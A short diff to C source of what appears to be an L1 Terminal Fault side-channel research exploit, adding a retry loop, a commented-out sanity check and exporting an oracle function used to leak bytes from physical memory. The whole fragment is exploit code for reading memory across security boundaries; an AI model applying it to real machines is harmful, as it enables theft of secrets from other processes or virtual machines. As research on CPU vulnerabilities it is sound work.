@@ -257,6 +257,7 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
   size_t start = (phys_addr & 0xfff);
   assert(start + length <= 0x1000);
 
+retry:
   for (int x = 0; x < 5000; ++x) {
     for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
       void *leak_addr = (char *)leak.leak + j;
@@ -284,6 +285,18 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
     size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
     data[i/2] = result;
   }
+
+  // // Sanity check using 2-byte granular leakage.
+  // printf("thijs_l1tf_leak sanity check | data = ");
+  // display(data, length);
+  // for (size_t i = 0; i+1 < length; i++) {
+  //   int signal = l1tf_oracle16(*(uint16_t *)(data+i), phys_addr+i, 10000, NULL);
+  //   printf("thijs_l1tf_leak sanity check |     at data+%2lu, magic %hx, signal = %d\n", i, *(uint16_t *)(data+i), signal);
+  //   if (!signal) {
+  //     printf("thijs_l1tf_leak sanity check |         no signal --> retrying\n");
+  //     goto retry;
+  //   }
+  // }
 
   free(results);
 
@@ -847,7 +860,7 @@ char *mathe_l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
   return secret;
 }
 
-static int l1tf_oracle16(uint16_t magic, uintptr_t pa, int nr_tries, void *touch) {
+int l1tf_oracle16(uint16_t magic, uintptr_t pa, int nr_tries, void *touch) {
   l1tf_leak_buffer_modify(&leak_addr, pa);
 
   int hits = 0;
